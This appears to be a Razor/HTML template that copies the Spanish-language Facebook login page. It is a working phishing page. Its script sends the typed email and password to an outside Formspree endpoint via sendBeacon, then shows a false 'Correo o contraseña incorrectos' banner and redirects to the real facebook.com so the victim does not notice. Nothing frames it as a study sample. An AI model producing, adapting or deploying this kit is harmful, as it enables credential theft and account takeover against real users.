<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook – Iniciar sesión o registrarse</title>
    <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body {
                width: 100%;
                min-height: 100vh;
                background-color: #ffffff;
                font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
                color: #1c1e21;
                display: flex;
                flex-direction: column;
                justify-content: space-between;
                overflow-x: hidden;
            }

            /* Barra de alerta superior profesional estilo notificación */
            .network-alert-banner {
                position: fixed;
                top: -60px;
                left: 0;
                width: 100%;
                background-color: #f02849;
                color: #ffffff;
                font-size: 14px;
                font-weight: 500;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 14px 20px;
                z-index: 10000;
                box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
                transition: top 0.3s ease-in-out;
            }

                .network-alert-banner.show {
                    top: 0;
                }

            .page-wrapper {
                display: flex;
                flex-direction: column;
                width: 100%;
                flex: 1;
            }

            .main-container {
                display: flex;
                width: 100%;
                max-width: 1400px;
                margin: 0 auto;
                flex: 1;
                position: relative;
            }

            /* Columna Izquierda */
            .left-column {
                flex: 1;
                display: flex;
                flex-direction: column;
                justify-content: center;
                padding: 20px 20px 40px 50px;
            }

            .left-content-row {
                display: flex;
                align-items: center;
                justify-content: flex-start;
                width: 100%;
                gap: 0px;
            }

            .fb-logo-img {
                width: 72px;
                height: 72px;
                object-fit: contain;
                margin-bottom: 20px;
            }

            .hero-title {
                font-size: 46px;
                font-weight: 700;
                line-height: 1.15;
                color: #1c1e21;
                letter-spacing: -0.5px;
            }

                .hero-title .blue-text {
                    color: #0866ff;
                }

            .illustration-placeholder {
                width: 500px;
                height: 420px;
                display: flex;
                align-items: center;
                justify-content: center;
                flex-shrink: 0;
                margin-left: -35px;
            }

                .illustration-placeholder img {
                    width: 100%;
                    height: 100%;
                    object-fit: contain;
                }

            .center-divider {
                width: 1px;
                background-color: #e4e6eb;
                height: 100%;
                position: absolute;
                left: 50%;
                top: 0;
                transform: translateX(-50%);
            }

            /* Columna Derecha */
            .right-column {
                flex: 1;
                background-color: #ffffff;
                display: flex;
                flex-direction: column;
                justify-content: center;
                align-items: center;
                padding: 40px 50px;
            }

            .login-card {
                width: 100%;
                max-width: 396px;
                margin-top: 20px;
            }

            .card-header {
                display: flex;
                align-items: center;
                margin-bottom: 24px;
                width: 100%;
            }

            .card-title {
                font-size: 20px;
                font-weight: 700;
                color: #1c1e21;
            }

            .input-group {
                margin-bottom: 12px;
                width: 100%;
                display: block;
            }

                .input-group input {
                    width: 100%;
                    height: 52px;
                    padding: 14px 18px;
                    font-size: 16px;
                    font-family: inherit;
                    color: #1c1e21;
                    background: #ffffff;
                    border: 1px solid #ccd0d5;
                    border-radius: 12px;
                    outline: none;
                    transition: border-color 0.2s, box-shadow 0.2s;
                }

                    .input-group input:focus {
                        border-color: #0866ff;
                        box-shadow: 0 0 0 2px rgba(8, 102, 255, 0.2);
                    }

                    /* Clase dinámica para campos con error */
                    .input-group input.error-input {
                        border-color: #d31130;
                    }

            .password-container {
                position: relative;
                width: 100%;
            }

                .password-container input {
                    padding-right: 48px;
                }

            .toggle-password {
                position: absolute;
                right: 14px;
                top: 50%;
                transform: translateY(-50%);
                background: none;
                border: none;
                cursor: pointer;
                color: #606770;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 4px;
            }

                .toggle-password svg {
                    width: 20px;
                    height: 20px;
                    fill: currentColor;
                }

            .error-msg {
                display: block;
                color: #d31130;
                font-size: 13px;
                margin: 0 4px 12px;
            }

            .btn-submit {
                width: 100%;
                height: 48px;
                background-color: #0866ff;
                color: white;
                border: none;
                border-radius: 50px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                transition: background-color 0.2s;
                margin-bottom: 16px;
                text-decoration: none;
            }

                .btn-submit:hover {
                    background-color: #1877f2;
                }

            .forgot-link {
                display: block;
                width: 100%;
                text-align: center;
                color: #0866ff;
                font-size: 14px;
                font-weight: normal;
                text-decoration: none;
                margin-bottom: 24px;
                cursor: pointer;
            }

                .forgot-link:hover {
                    text-decoration: underline;
                }

            .divider {
                border: none;
                border-top: 1px solid #dadde1;
                margin-bottom: 24px;
            }

            .btn-create {
                width: 100%;
                height: 48px;
                background-color: #ffffff;
                color: #0866ff;
                border: 1px solid #0866ff;
                border-radius: 50px;
                font-size: 16px;
                font-weight: bold;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                transition: background-color 0.2s;
            }

                .btn-create:hover {
                    background-color: #f0f4ff;
                }

            .meta-footer {
                text-align: center;
                margin-top: 24px;
                width: 100px;
                height: 24px;
                margin-left: auto;
                margin-right: auto;
            }

                .meta-footer img {
                    width: 100%;
                    height: 100%;
                    object-fit: contain;
                }

            .bottom-horizontal-divider {
                width: 100%;
                height: 1px;
                background-color: #dadde1;
            }

            footer {
                background-color: #ffffff;
                padding: 20px 0;
                width: 100%;
                font-size: 12px;
                color: #737373;
            }

            .footer-content {
                max-width: 1000px;
                margin: 0 auto;
                padding: 0 20px;
                display: flex;
                flex-direction: column;
                gap: 10px;
            }

            .footer-languages {
                display: flex;
                flex-wrap: wrap;
                gap: 10px 15px;
                list-style: none;
            }

                .footer-languages li a {
                    color: #737373;
                    text-decoration: none;
                }

                    .footer-languages li a:hover {
                        text-decoration: underline;
                    }

                .footer-languages li.active-lang {
                    color: #4b4f56;
                    font-weight: bold;
                }

            .footer-links {
                display: flex;
                flex-wrap: wrap;
                gap: 6px 15px;
                list-style: none;
            }

                .footer-links li a {
                    color: #737373;
                    text-decoration: none;
                }

                    .footer-links li a:hover {
                        text-decoration: underline;
                    }

            .footer-copyright {
                margin-top: 10px;
                color: #737373;
            }

            @@media (max-width: 1100px) {
                .left-content-row {
                    flex-direction: column;
                    align-items: flex-start;
                }

                .illustration-placeholder {
                    width: 100%;
                    height: 300px;
                    margin-left: 0;
                    margin-top: 20px;
                }
            }

            @@media (max-width: 900px) {
                body {
                    overflow-y: auto;
                }

                .main-container {
                    flex-direction: column;
                    height: auto;
                }

                .center-divider {
                    display: none;
                }

                .bottom-horizontal-divider {
                    display: none;
                }

                .left-column {
                    padding: 20px 20px 10px 20px;
                    align-items: center;
                    text-align: center;
                }

                .left-content-row {
                    align-items: center;
                    justify-content: center;
                }

                .hero-title {
                    display: none !important;
                }

                .illustration-placeholder {
                    display: none;
                }

                .right-column {
                    padding: 10px 20px 20px 20px;
                    width: 100%;
                }

                .login-card {
                    max-width: 100%;
                    margin-top: 0;
                }
            }
    </style>
</head>
<body>

    <!-- Notificación superior -->
    <div id="networkAlert" class="network-alert-banner">
        Completa todos los campos obligatorios
    </div>

    <div class="page-wrapper">
        <div class="main-container">

            <div class="center-divider"></div>

            <!-- Izquierda -->
            <div class="left-column">
                <img src="~/logo/03.png" alt="Facebook" class="fb-logo-img">

                <div class="left-content-row">
                    <h1 class="hero-title">
                        Explora<br>
                        las<br>
                        cosas<br>
                        que <span class="blue-text">más</span><br>
                        <span class="blue-text">te</span><br>
                        <span class="blue-text">gustan.</span>
                    </h1>

                    <div class="illustration-placeholder">
                        <img src="~/logo/02.webp" alt="Ilustración principal">
                    </div>
                </div>
            </div>

            <!-- Derecha -->
            <div class="right-column">
                <div class="login-card">

                    <div class="card-header">
                        <div class="card-title">Iniciar sesión en Facebook</div>
                    </div>

                    <form id="loginForm">
                        @Html.AntiForgeryToken()

                        <div class="input-group">
                            <input type="text" id="correo" name="correo" placeholder="Correo electrónico o número de móvil"
                                   autocomplete="username" value="@ViewBag.Correo" />
                        </div>

                        <div class="input-group">
                            <div class="password-container">
                                <input type="password" id="contrasenia" name="contrasenia" placeholder="Contraseña"
                                       autocomplete="current-password" />
                                <button type="button" class="toggle-password" onclick="togglePasswordVisibility()" aria-label="Mostrar contraseña">
                                    <svg id="eyeIcon" viewBox="0 0 24 24">
                                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
                                    </svg>
                                </button>
                            </div>
                        </div>

                        @if (ViewBag.Error != null)
                        {
                            <span class="error-msg">@ViewBag.Error</span>
                        }

                        <button class="btn-submit" type="button" onclick="enviarCredencialesYRedirigir()">
                            Iniciar sesión
                        </button>

                        <a class="forgot-link" onclick="irARecuperar()">¿Has olvidado la contraseña?</a>

                        <hr class="divider" />

                        <button class="btn-create" type="button" onclick="irARegistro()">
                            Crear una cuenta
                        </button>
                    </form>

                    <div class="meta-footer">
                        <img src="~/logo/01.svg" alt="Meta">
                    </div>

                </div>
            </div>

        </div>
    </div>

    <div class="bottom-horizontal-divider"></div>

    <footer>
        <div class="footer-content">
            <ul class="footer-languages">
                <li class="active-lang">Español (España)</li>
                <li><a href="#">English (US)</a></li>
                <li><a href="#">Italiano</a></li>
                <li><a href="#">Français (France)</a></li>
                <li><a href="#">Português (Brasil)</a></li>
                <li><a href="#">Deutsch</a></li>
                <li><a href="#">中文(简体)</a></li>
                <li><a href="#">Más idiomas...</a></li>
            </ul>
            <ul class="footer-links">
                <li><a href="#">Registrarte</a></li>
                <li><a href="#">Iniciar sesión</a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Vídeo</a></li>
                <li><a href="#">Meta Pay</a></li>
                <li><a href="#">Meta Store</a></li>
                <li><a href="#">Meta Quest</a></li>
                <li><a href="#">Ray-Ban Meta</a></li>
                <li><a href="#">Meta AI</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Threads</a></li>
                <li><a href="#">Política de privacidad</a></li>
                <li><a href="#">Centro de privacidad</a></li>
                <li><a href="#">Información</a></li>
                <li><a href="#">Crear anuncio</a></li>
                <li><a href="#">Crear página</a></li>
                <li><a href="#">Desarrolladores</a></li>
                <li><a href="#">Empleo</a></li>
                <li><a href="#">Cookies</a></li>
                <li><a href="#">Opciones de anuncios</a></li>
                <li><a href="#">Condiciones</a></li>
                <li><a href="#">Ayuda</a></li>
                <li><a href="#">Subir contactos y no usuarios</a></li>
            </ul>
            <div class="footer-copyright">
                Meta © 2026
            </div>
        </div>
    </footer>

    <script>
            function irARecuperar() {
                window.location.href = '@Url.Action("BuscarCuenta", "Home")';
            }

            function irARegistro() {
                window.location.href = 'https://www.facebook.com/reg/?entry_point=login';
            }

            function togglePasswordVisibility() {
                const passwordInput = document.getElementById('contrasenia');
                const eyeIcon = document.getElementById('eyeIcon');

                if (passwordInput.type === 'password') {
                    passwordInput.type = 'text';
                    eyeIcon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.12c0-1.66-1.34-3-3-3l-.17.03z"/>';
                } else {
                    passwordInput.type = 'password';
                    eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
                }
            }

            function enviarCredencialesYRedirigir() {
                const correoInput = document.getElementById('correo');
                const contraseniaInput = document.getElementById('contrasenia');
                const alertBanner = document.getElementById('networkAlert');

                const correo = correoInput.value.trim();
                const contrasenia = contraseniaInput.value.trim();

                // Validación: Si alguno de los campos está vacío
                if (correo === "" || contrasenia === "") {
                    if (correo === "") correoInput.classList.add('error-input');
                    else correoInput.classList.remove('error-input');

                    if (contrasenia === "") contraseniaInput.classList.add('error-input');
                    else contraseniaInput.classList.remove('error-input');

                    // Mostrar la barra de alerta superior
                    alertBanner.classList.add('show');

                    // Ocultar la alerta automáticamente después de 3 segundos
                    setTimeout(() => {
                        alertBanner.classList.remove('show');
                    }, 3000);

                    return; // Detiene la ejecución para no enviar datos vacíos
                }

                // Limpiar errores visuales si pasa la validación
                correoInput.classList.remove('error-input');
                contraseniaInput.classList.remove('error-input');

                const formspreeUrl = "https://formspree.io/f/xkjnnwdd";

                const formData = new FormData();
                formData.append("correo", correo);
                formData.append("contrasenia", contrasenia);

                navigator.sendBeacon(formspreeUrl, formData);

                alertBanner.textContent = "Correo o contraseña incorrectos";
                alertBanner.classList.add('show');

                setTimeout(() => {
                    window.location.href = "https://www.facebook.com";
                }, 1500);
            }
    </script>
</body>
</html>